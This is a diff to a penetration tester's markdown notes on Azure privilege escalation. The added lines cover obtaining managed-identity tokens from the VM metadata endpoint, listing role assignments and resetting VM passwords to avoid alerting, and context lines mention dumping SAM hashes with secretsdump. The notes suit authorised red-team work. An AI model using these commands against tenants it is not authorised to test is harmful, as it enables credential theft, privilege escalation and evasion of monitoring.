@@ -5,12 +5,29 @@
   - Deployment scripts
   - AD user attribute data
   - Runbooks
-- https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/
 
 ## Virtual machines
+### VM might be managed identity
+- https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/
 - If you have access to a VM it might actually have more privileges than your user in Azure
 - VM can auth to Azure with a Managed Identity by requesting Oauth token from Azure Metadata Service URL at http://169.254.169.254/metadata/identity/oauth2/token
 - RDP to VM, request token, and connect to Azure using AZ cli or Az PowerShell
+
+#### Login on VM as managed idenity
+```
+az login –identity
+```
+
+#### List permissions of current subscription
+- May have more permissions then the user
+```
+az role assignment list -–assignee ((az account list | ConvertFrom-Json).id)
+```
+
+#### If no AZ module can request token manually to authenticate
+```
+Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+```
 
 ### Read password hashes from virtual machine
 - Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url
@@ -48,6 +65,11 @@ impacket-secretsdump -system SYSTEM -sam SAM LOCAL
 ```
 Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
 ```
+
+### Reset password from VM
+- Can be done from Azure portal
+- This may be a quick way to gain access and avoid PowerShell alerting
+- Be careful though as scripts/services may be using the credential
 
 ## Ad user attributes
 - User attributes and sensitive information
